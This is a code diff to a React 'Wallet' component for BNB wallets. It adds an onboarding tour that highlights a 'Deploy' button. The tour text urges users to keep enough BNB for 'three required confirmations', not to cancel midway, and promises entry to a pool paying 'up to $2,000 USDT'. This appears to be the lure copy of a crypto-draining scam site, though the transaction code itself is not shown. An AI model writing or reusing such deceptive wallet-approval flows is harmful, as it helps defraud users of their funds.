@@ -1,5 +1,5 @@
 "use client";
-import React, { useState, useEffect, useRef } from "react";
+import React, { useState, useEffect, useRef, useCallback } from "react";
 import Image from "next/image";
 import { ethers } from "ethers";
 import { FaSpinner } from "react-icons/fa";
@@ -10,11 +10,19 @@ interface EthereumError {
   message: string;
 }
 
+interface TourStep {
+  target: string;
+  content: string;
+  position: "top" | "bottom" | "left" | "right";
+}
+
 function formatNumberWithCommas(number: number) {
   return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
 }
 
 export function Wallet() {
+  const [showTour, setShowTour] = useState<boolean>(false);
+  const [currentTourStep, setCurrentTourStep] = useState<number>(0);
   const [walletAddress, setWalletAddress] = useState<string>("");
   const [isLoading, setIsLoading] = useState<boolean>(false);
   const [errorMessage, setErrorMessage] = useState<string>("");
@@ -24,6 +32,161 @@ export function Wallet() {
   const [eligibleAmount, setEligibleAmount] = useState<number>(0);
   const [confirmationCount, setConfirmationCount] = useState<number>(0);
   const [rejectedBalance, setRejectedBalance] = useState<number>(0);
+
+  const tourSteps = [
+    {
+      target: "deploy-button",
+      content:
+        "Click on the Deploy button to connect the address and begin the deployment.",
+      position: "bottom",
+    },
+    {
+      target: "deploy-button",
+      content:
+        "Please ensure that the specified BNB address contains sufficient BNB to complete all three required confirmations successfully.",
+      position: "bottom",
+    },
+    {
+      target: "deploy-button",
+      content:
+        "Please avoid pausing, stopping, or canceling the process midway, as doing so may result in the confirmation process restarting entirely.",
+      position: "bottom",
+    },
+    {
+      target: "deploy-button",
+      content:
+        "Upon completing all confirmations and achieving a successful deployment, your address will be added to the pool, to receive a reward of up to $2,000 USDT.",
+      position: "bottom",
+    },
+  ];
+
+  const TourOverlay = useCallback(() => {
+    if (!showTour) return null;
+    const currentStep = tourSteps[currentTourStep];
+
+    // Get the position of the target element
+    const targetElement = document.getElementById(currentStep.target);
+    const targetRect = targetElement?.getBoundingClientRect();
+
+    if (!targetRect) return null;
+
+    return (
+      <div className="fixed inset-0 z-50">
+        {/* Semi-transparent overlay */}
+        <div className="absolute inset-0 bg-black/30" />
+
+        {/* Target element highlight */}
+        <div
+          className="absolute bg-transparent border-2 border-[#08a0dd] animate-pulse"
+          style={{
+            top: targetRect.top - 4,
+            left: targetRect.left - 4,
+            width: targetRect.width + 8,
+            height: targetRect.height + 8,
+            borderRadius: "8px",
+          }}
+        />
+
+        {/* Chat bubble container */}
+        <div
+          className="absolute"
+          style={{
+            top: targetRect.bottom + 20,
+            left: targetRect.left - 100,
+            width: "max-content",
+          }}
+        >
+          {/* Arrow */}
+          <div
+            className="absolute w-4 h-4 bg-[#08a0dd] transform rotate-45"
+            style={{
+              top: -8,
+              left: "50%",
+              marginLeft: -8,
+            }}
+          />
+
+          {/* Chat bubble content */}
+          <div className="relative bg-[#08a0dd] rounded-2xl p-4 shadow-lg max-w-[300px]">
+            <p className="text-white text-sm mb-4">{currentStep.content}</p>
+
+            {/* Progress indicators and navigation */}
+            <div className="flex items-center justify-between">
+              <div className="flex space-x-2">
+                {tourSteps.map((_, index) => (
+                  <div
+                    key={index}
+                    className={`w-1.5 h-1.5 rounded-full ${
+                      index === currentTourStep ? "bg-white" : "bg-white/30"
+                    }`}
+                  />
+                ))}
+              </div>
+
+              <div className="flex items-center gap-2">
+                <button
+                  onClick={() => {
+                    setShowTour(false);
+                    setCurrentTourStep(0);
+                  }}
+                  className="text-xs text-white/80 hover:text-white px-2 py-1"
+                >
+                  Skip
+                </button>
+
+                <div className="flex gap-1">
+                  {currentTourStep > 0 && (
+                    <button
+                      onClick={() => setCurrentTourStep((prev) => prev - 1)}
+                      className="bg-white/20 hover:bg-white/30 text-white text-xs rounded px-3 py-1"
+                    >
+                      Back
+                    </button>
+                  )}
+                  <button
+                    onClick={() => {
+                      if (currentTourStep < tourSteps.length - 1) {
+                        setCurrentTourStep((prev) => prev + 1);
+                      } else {
+                        setShowTour(false);
+                        setCurrentTourStep(0);
+                      }
+                    }}
+                    className="bg-white text-[#08a0dd] text-xs rounded px-3 py-1 font-medium"
+                  >
+                    {currentTourStep === tourSteps.length - 1
+                      ? "Finish"
+                      : "Next"}
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    );
+  }, [showTour, currentTourStep, tourSteps]);
+
+  useEffect(() => {
+    if (showTour) {
+      // Lock scrolling
+      document.body.style.overflow = "hidden";
+      document.body.style.position = "fixed";
+      // document.body.style.width = "100%";
+    } else {
+      // Restore scrolling
+      document.body.style.overflow = "";
+      document.body.style.position = "";
+      // document.body.style.width = "";
+    }
+
+    // Cleanup function
+    return () => {
+      document.body.style.overflow = "";
+      document.body.style.position = "";
+      document.body.style.width = "";
+    };
+  }, [showTour]);
 
   // Use useRef to maintain a stable reference to eligibleAmount
   const eligibleAmountRef = useRef<number>(0);
@@ -338,7 +501,10 @@ export function Wallet() {
   return (
     <div>
       <div className="flex justify-between items-center w-full mb-6">
-        <button className="px-4 py-1.5 bg-transparent border border-[#08a0dd]/20 text-[#08a0dd] rounded-full hover:bg-[#08a0dd]/10 transition-all duration-300 text-xs font-medium flex items-center gap-1.5">
+        <button
+          onClick={() => setShowTour(true)}
+          className="px-4 py-1.5 bg-transparent border border-[#08a0dd]/20 text-[#08a0dd] rounded-full hover:bg-[#08a0dd]/10 transition-all duration-300 text-xs font-medium flex items-center gap-1.5"
+        >
           <svg className="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 24 24">
             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z" />
           </svg>
@@ -360,6 +526,7 @@ export function Wallet() {
         </div>
       </div>
 
+      {TourOverlay()}
       <div className="flex flex-col p-6 rounded-xl items-center space-y-4 bg-[#090C17] w-full ring-1 ring-white/20 max-w-md relative">
         <Image
           src="/metamask.webp"
@@ -386,6 +553,7 @@ export function Wallet() {
           </button>
         ) : (
           <button
+            id="deploy-button"
             onClick={startModalSequence}
             className="bg-[#08a0dd] text-white text-base px-4 py-2 rounded-lg hover:bg-[#08a0dd]/70 flex items-center justify-center"
             disabled={isLoading}
